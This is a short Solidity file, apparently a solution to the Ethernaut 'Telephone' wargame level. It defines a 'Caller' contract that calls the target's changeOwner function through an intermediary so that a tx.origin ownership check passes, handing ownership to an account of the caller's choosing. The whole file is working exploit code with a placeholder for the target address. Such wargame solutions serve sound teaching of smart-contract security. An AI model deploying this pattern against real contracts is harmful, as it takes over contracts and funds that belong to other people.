pragma solidity ^0.4.19;

import '/Telephone.sol';


contract Caller {
    Telephone public originalContract;
    address public owner;
    
    constructor() public {
    	originalContract = Telephone(/* CONTRACT ADDRESS */);
        owner = msg.sender;
    }
    
    function callTelephone(address _owner) public {   //argument should be the account you want to own the telephone contract
        originalContract.changeOwner(_owner);       
    }
}